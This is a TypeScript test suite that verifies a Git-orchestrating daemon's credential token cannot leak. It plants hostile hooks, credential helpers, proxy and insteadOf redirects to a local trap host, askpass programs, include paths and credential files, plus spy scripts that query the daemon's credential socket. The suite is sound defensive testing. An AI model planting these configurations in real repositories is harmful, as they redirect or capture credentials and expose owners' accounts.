import { appendFile, mkdir, readFile, readdir, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo, Socket } from 'node:net';
import { join } from 'node:path';
import type { GitCredentialRequest } from '@orchestrator/protocol';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { Git } from '../src/git.js';
import { shellCommand } from '../src/self.js';
import { TrustRegistry } from '../src/trust.js';
import { Workspaces } from '../src/workspace.js';
import { startGitHttpServer, type GitHttpServer } from './git-http-server.js';
import { REAL_GITHUB_PROXY_ENV } from './real-github-guard.js';
import { createRemote, gitIn } from './remote.js';
import { runStartPayload } from './run-start.js';
import {
  DAEMON_COMMAND,
  captureLogger,
  createTestHome,
  fakeExecutable,
  linkSystemTool,
  type TestHome,
} from './testing.js';

// The token never leaves through a Git configuration or a file an agent can change (05, section
// 7; lot 3 step D1). Each case plants a way to leak in the bare clone (shared by the run's
// worktree), in the test home's global configuration, or both, then the daemon pushes and fetches
// with the credential. Five checks each time: a listener on another host receives nothing; the
// spy programs never run; the Git server sees only the run's repository; no file holds the token
// afterwards; no process shows it in its arguments or environment while the commands run.

const TOKEN = 'ghp_LeakTestTokenThatMustNeverLeave0123456789';
const CREDENTIAL = { ok: true as const, username: 'x-access-token', password: TOKEN };

let home: TestHome;
let git: Git;
let server: GitHttpServer;
let trap: Trap;
let asked: GitCredentialRequest['payload'][];
let workspaces: Workspaces;
let spies: string;

/** A listener on another loopback address, answering every request with a Basic challenge. */
interface Trap {
  url: string;
  /** Connections received, and the `Authorization` headers sent. */
  connections: number;
  authorizations: string[];
  close(): Promise<void>;
}

async function startTrap(): Promise<Trap> {
  const sockets = new Set<Socket>();
  const trap: Trap = {
    url: '',
    connections: 0,
    authorizations: [],
    close: async () => {
      for (const socket of sockets) socket.destroy();
      await new Promise<void>((resolve) => {
        listener.close(() => {
          resolve();
        });
      });
    },
  };
  const listener: Server = createServer((request, response) => {
    const authorization = request.headers.authorization ?? request.headers['proxy-authorization'];
    if (authorization) trap.authorizations.push(authorization);
    request.resume();
    response.writeHead(401, { 'WWW-Authenticate': 'Basic realm="trap"' }).end();
  });
  listener.on('connection', (socket) => {
    trap.connections++;
    sockets.add(socket);
    socket.on('close', () => sockets.delete(socket));
  });
  // A CONNECT through the trap as a proxy gets nothing either.
  listener.on('connect', (_request, socket: Socket) => {
    socket.end('HTTP/1.1 403 Forbidden\r\n\r\n');
  });
  await new Promise<void>((resolve) => listener.listen(0, '127.0.0.2', resolve));
  trap.url = `http://127.0.0.2:${String((listener.address() as AddressInfo).port)}`;
  return trap;
}

beforeEach(async () => {
  home = await createTestHome();
  await linkSystemTool(home.bin, 'git');
  // No proxy variables here: `no_proxy` would keep curl from using a planted proxy, hiding the
  // attack. Every address of this file is a local one (working rule 9 holds).
  git = new Git(
    join(home.bin, 'git'),
    Object.fromEntries(
      Object.entries(home.env).filter(([name]) => !(name in REAL_GITHUB_PROXY_ENV)),
    ),
  );
  const remotes = join(home.root, 'remotes');
  await createRemote(remotes, 'owner', 'notes', home.env);
  server = await startGitHttpServer(remotes, CREDENTIAL, { delayMs: 150 });
  trap = await startTrap();
  asked = [];
  spies = join(home.root, 'spied');
  await mkdir(spies);
  await mkdir(join(home.root, 'spies'));
  workspaces = new Workspaces({
    paths: home.paths,
    git,
    trust: new TrustRegistry(join(home.paths.claudeConfig, '.claude.json')),
    credentials: (request) => {
      asked.push(request);
      return Promise.resolve(CREDENTIAL);
    },
    selfCommand: DAEMON_COMMAND,
    log: captureLogger().log,
  });
});

afterEach(async () => {
  await server.close();
  await trap.close();
  await home.remove();
});

/** Where the run's repository is served, as Git asks for it. */
function serverHost(): string {
  return new URL(server.url).host;
}

/**
 * A program that records that it ran, then tries what an attacker's program would: ask the
 * daemon's credential socket, with the variables it inherited, for the run's own repository.
 * `withStdin` also records what Git wrote to it (a credential helper's `store`, a hook's refs).
 */
async function spy(name: string, withStdin = false): Promise<string> {
  const record = join(spies, name);
  const steal = shellCommand([...DAEMON_COMMAND, 'git-credential', 'get']);
  return fakeExecutable(
    join(home.root, 'spies'),
    name,
    [
      `printf 'ran\\n' >> '${record}'`,
      withStdin ? `while read -r line; do printf '%s\\n' "$line" >> '${record}'; done` : '',
      `printf 'protocol=http\\nhost=${serverHost()}\\npath=owner/notes.git\\n\\n' | ${steal} >> '${record}' 2>&1`,
      // An askpass is expected to print an answer.
      `printf 'x\\n'`,
    ].join('\n'),
  );
}

/** Appends Git configuration text to `file`. */
function configure(file: string, text: string): Promise<void> {
  return appendFile(file, `${text}\n`);
}

/** The test home's two global configuration files (`~/.gitconfig` and the XDG one). */
function globalConfigs(): string[] {
  return [
    join(home.env.HOME ?? '', '.gitconfig'),
    join(home.env.XDG_CONFIG_HOME ?? '', 'git', 'config'),
  ];
}

interface Planted {
  bare: string;
  worktree: string;
}

/** Every file under `folder` holding `text` (sockets and unreadable files skipped). */
async function filesHolding(folder: string, text: string): Promise<string[]> {
  const found: string[] = [];
  for (const entry of await readdir(folder, { withFileTypes: true, recursive: true })) {
    if (!entry.isFile()) continue;
    const path = join(entry.parentPath, entry.name);
    const content = await readFile(path).catch(() => null);
    if (content?.includes(text)) found.push(path);
  }
  return found;
}

/**
 * Reads every process's arguments and environment until stopped: those showing the token, and
 * whether a Git process holding the credential variables was seen at all (so the sampling
 * watched the commands).
 */
function sampleProcesses(): { stop: () => Promise<{ leaks: string[]; sawCredentialed: boolean }> } {
  const leaks = new Set<string>();
  let sawCredentialed = false;
  const sampling = { running: true };
  const loop = (async () => {
    while (sampling.running) {
      for (const pid of await readdir('/proc').catch(() => [] as string[])) {
        if (!/^\d+$/.test(pid)) continue;
        const [command, environment] = await Promise.all([
          readFile(`/proc/${pid}/cmdline`).catch(() => null),
          readFile(`/proc/${pid}/environ`).catch(() => null),
        ]);
        if (command?.includes(TOKEN))
          leaks.add(`arguments of ${command.toString().replace(/\0/g, ' ')}`);
        if (environment?.includes(TOKEN)) leaks.add(`environment of ${pid}`);
        if (environment?.includes('ORCHESTRATOR_CREDENTIAL_SOCKET=') && command?.includes('git')) {
          sawCredentialed = true;
        }
      }
      await new Promise((resolve) => setTimeout(resolve, 10));
    }
  })();
  return {
    stop: async () => {
      sampling.running = false;
      await loop;
      return { leaks: [...leaks], sawCredentialed };
    },
  };
}

async function runFolder(runId: string): Promise<string> {
  const folder = join(home.paths.home, 'runs', runId);
  await mkdir(folder, { recursive: true, mode: 0o700 });
  return folder;
}

async function prepare() {
  const start = runStartPayload(`${server.url}/owner/notes.git`);
  const folder = await runFolder(start.runId);
  return { start, folder, ...(await workspaces.prepare(start, folder)) };
}

/**
 * Prepares a run, commits in its worktree, plants `plant`, then pushes and makes a second run
 * (a fetch and a new worktree), and runs the five checks.
 */
async function attempt(plant: (planted: Planted) => Promise<void>): Promise<void> {
  const run = await prepare();
  gitIn(run.worktree, ['commit', '--quiet', '--allow-empty', '-m', 'Agent work'], home.env);
  const head = gitIn(run.worktree, ['rev-parse', 'HEAD'], home.env).trim();
  await plant({ bare: run.bare, worktree: run.worktree });
  asked.length = 0;
  server.requests.length = 0;

  const sampler = sampleProcesses();
  const pushed = await workspaces.push(run.start, run.bare, run.folder, head);
  await workspaces.remove(run.bare, run.worktree);
  await prepare();
  const sampled = await sampler.stop();

  // The work arrived where it belongs, with the credential asked for once per command.
  expect(pushed).toEqual({ status: 'pushed', head });
  expect(
    gitIn(
      join(home.root, 'remotes', 'owner', 'notes.git'),
      ['rev-parse', 't/1-add-notes'],
      home.env,
    ).trim(),
  ).toBe(head);
  expect(asked.map((request) => request.command)).toEqual(['push', 'fetch']);
  // 1. Nothing reached another host.
  expect({ connections: trap.connections, authorizations: trap.authorizations }).toEqual({
    connections: 0,
    authorizations: [],
  });
  // 2. No planted program ran.
  expect(await readdir(spies)).toEqual([]);
  // 3. The Git server saw only the run's repository.
  expect(server.requests.length).toBeGreaterThan(0);
  for (const request of server.requests) expect(request.path).toMatch(/^\/owner\/notes\.git\//);
  // 4. No file holds the token.
  expect(await filesHolding(home.root, TOKEN)).toEqual([]);
  // 5. No process showed it, while a credentialed Git process was seen.
  expect(sampled).toEqual({ leaks: [], sawCredentialed: true });
}

describe('no way to leak the token through Git configuration or files', () => {
  it('hooks of the bare clone, core.hooksPath, and the global core.hooksPath', async () => {
    await attempt(async ({ bare }) => {
      const hooks = join(home.root, 'agent-hooks');
      await mkdir(hooks);
      for (const name of [
        'pre-push',
        'reference-transaction',
        'post-checkout',
        'post-update',
        'push-to-checkout',
        'pre-auto-gc',
      ]) {
        const program = await spy(`hook-${name}`, true);
        await writeFile(join(bare, 'hooks', name), `#!/bin/sh\nexec '${program}' "$@"\n`, {
          mode: 0o755,
        });
        await writeFile(join(hooks, name), `#!/bin/sh\nexec '${program}' "$@"\n`, { mode: 0o755 });
      }
      await configure(join(bare, 'config'), `[core]\n\thooksPath = ${hooks}`);
      for (const file of globalConfigs()) await configure(file, `[core]\n\thooksPath = ${hooks}`);
    });
  }, 60_000);

  it('credential helpers, by URL too, in the bare clone and the global configuration', async () => {
    await attempt(async ({ bare }) => {
      const helper = await spy('credential-helper', true);
      const text = [
        '[credential]',
        `\thelper = !${helper}`,
        '\tusername = attacker',
        `[credential "${server.url}"]`,
        `\thelper = !${helper}`,
      ].join('\n');
      await configure(join(bare, 'config'), text);
      for (const file of globalConfigs()) await configure(file, text);
    });
  }, 60_000);

  it('url.insteadOf, pushInsteadOf, and a changed remote and push URL', async () => {
    await attempt(async ({ bare }) => {
      const text = [
        `[url "${trap.url}/"]`,
        `\tinsteadOf = ${server.url}/`,
        `\tpushInsteadOf = ${server.url}/`,
        '[remote "origin"]',
        `\turl = ${trap.url}/owner/notes.git`,
        `\tpushurl = ${trap.url}/owner/notes.git`,
      ].join('\n');
      await configure(join(bare, 'config'), text);
      for (const file of globalConfigs()) await configure(file, text);
    });
  }, 60_000);

  it('http.proxy, http.sslVerify, http.curloptResolve and http.extraHeader', async () => {
    await attempt(async ({ bare }) => {
      const text = [
        '[http]',
        `\tproxy = ${trap.url}`,
        '\tsslVerify = false',
        `\tcurloptResolve = ${serverHost()}:127.0.0.2`,
        '\textraHeader = X-Planted: yes',
        `[http "${server.url}/"]`,
        `\tproxy = ${trap.url}`,
      ].join('\n');
      await configure(join(bare, 'config'), text);
      for (const file of globalConfigs()) await configure(file, text);
    });
  }, 60_000);

  it('programs Git could start: ssh command, Git proxy, remote helper, upload and receive pack, askpass', async () => {
    await attempt(async ({ bare }) => {
      const program = await spy('program');
      // A remote helper found in the PATH by `remote.<name>.vcs`.
      await fakeExecutable(home.bin, 'git-remote-planted', `exec '${await spy('remote-helper')}'`);
      const text = [
        '[core]',
        `\tsshCommand = ${program}`,
        `\tgitProxy = ${program}`,
        `\taskPass = ${await spy('askpass')}`,
        '[remote "origin"]',
        '\tvcs = planted',
        `\tuploadpack = ${program}`,
        `\treceivepack = ${program}`,
        // Sent elsewhere first, so the daemon's helper refuses and Git falls back to askpass.
        `[url "${trap.url}/"]`,
        `\tinsteadOf = ${server.url}/`,
      ].join('\n');
      await configure(join(bare, 'config'), text);
      for (const file of globalConfigs()) await configure(file, text);
    });
  }, 60_000);

  it('include.path and includeIf, in the bare clone and the global configuration', async () => {
    await attempt(async ({ bare }) => {
      const included = join(home.root, 'included-config');
      await writeFile(
        included,
        [
          '[http]',
          `\tproxy = ${trap.url}`,
          '[core]',
          `\taskPass = ${await spy('included-askpass')}`,
          `\thooksPath = ${join(home.root, 'nowhere')}`,
        ].join('\n'),
      );
      const text = [
        '[include]',
        `\tpath = ${included}`,
        `[includeIf "gitdir:${bare}/"]`,
        `\tpath = ${included}`,
      ].join('\n');
      await configure(join(bare, 'config'), text);
      for (const file of globalConfigs()) await configure(file, text);
    });
  }, 60_000);

  it("the owner's ~/.netrc and ~/.git-credentials", async () => {
    await attempt(async () => {
      const userHome = home.env.HOME ?? '';
      await writeFile(
        join(userHome, '.netrc'),
        `machine 127.0.0.1 login attacker password planted\nmachine 127.0.0.2 login a password b\n`,
      );
      await writeFile(
        join(userHome, '.git-credentials'),
        `http://attacker:planted@${serverHost()}\n`,
      );
      for (const file of globalConfigs()) {
        await configure(file, `[credential]\n\thelper = store\n[http]\n\tproxy = ${trap.url}`);
      }
    });
  }, 60_000);
});

describe("lot 2's fetch (regressions: these failed before step D1)", () => {
  it("a proxy in the bare clone's configuration gets nothing at the next fetch", async () => {
    const first = await prepare();
    await configure(
      join(first.bare, 'config'),
      `[http]\n\tproxy = ${trap.url}\n\tsslVerify = false`,
    );
    await workspaces.remove(first.bare, first.worktree);
    const fetched = await prepare().then(() => 'fetched', String);
    // Before step D1 the proxy received `Authorization: Basic` with the token.
    expect(trap.authorizations).toEqual([]);
    expect(trap.connections).toBe(0);
    expect(fetched).toBe('fetched');
  }, 60_000);

  it('a planted askpass, run after the helper refused another host, gets nothing', async () => {
    const first = await prepare();
    await configure(
      join(first.bare, 'config'),
      [
        '[core]',
        `\taskPass = ${await spy('askpass')}`,
        `[remote "origin"]`,
        `\tpushurl = ${trap.url}/owner/notes.git`,
        `[url "${trap.url}/"]`,
        `\tinsteadOf = ${server.url}/`,
      ].join('\n'),
    );
    await workspaces.remove(first.bare, first.worktree);
    const fetched = await prepare().then(() => 'fetched', String);
    // Before step D1 the askpass ran and the daemon's socket gave it the token.
    expect(await readdir(spies)).toEqual([]);
    expect(await filesHolding(home.root, TOKEN)).toEqual([]);
    expect(trap.authorizations).toEqual([]);
    expect(fetched).toBe('fetched');
  }, 60_000);
});
